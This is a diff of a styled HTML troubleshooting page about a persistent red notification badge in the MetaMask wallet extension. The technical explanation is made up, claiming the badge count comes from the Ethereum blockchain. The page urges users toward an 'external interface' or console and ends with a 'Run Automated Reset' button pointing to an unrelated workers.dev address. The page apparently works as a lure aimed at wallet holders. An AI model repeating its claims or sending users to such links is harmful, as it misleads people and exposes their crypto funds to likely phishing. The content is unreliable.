@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,31 +42,31 @@
 <h1>Metamask Extension Bug Notifications Notification Badge Red Num</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The notification badge, represented by a red number in the Metamask icon, appears and persists even after reviewing all notifications, indicating unsolved issues within the extension.</li>
+<li>The Metamask extension displays a red notification badge with a number, indicating unread notifications, even after the user has read all notifications.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a synchronization issue between the user's Ethereum account and the Metamask extension, often triggered by outdated software, incorrect network configurations, or unresolved transaction states.</li>
+<li>The error occurs due to a caching issue or a mismatch between the local notification count and the actual number of unread notifications on the Ethereum blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Clear the browser's cache and storage for the Metamask extension to reset its state.</li>
-<li>Update Metamask to the latest version to ensure compatibility with the current Ethereum network state.</li>
+<li>Clear the browser's local storage and cookies for the Metamask extension.</li>
+<li>Reset the notification count manually by setting <code>notificationCount</code> to 0 in the extension's internal state:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;reset&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;clearCache&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">  </span><span class="nt">&quot;notificationCount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external interface for direct manipulation of extension settings.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>An Ethereum wallet set up in Metamask.</li>
-<li>The latest version of the browser being used.</li>
-<li>A stable internet connection for seamless synchronization.</li>
+<li>Force-refresh the Metamask extension by running <code>window.location.reload()</code> in the browser console.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
+<p>Prerequisites:
+* Metamask extension is installed and enabled.
+* User has a valid Ethereum wallet set up.
+* Browser is updated to the latest version.</p>
+<p>For further debugging, consider using an external console to inspect the extension's internal state.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed As Contract Interaction</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
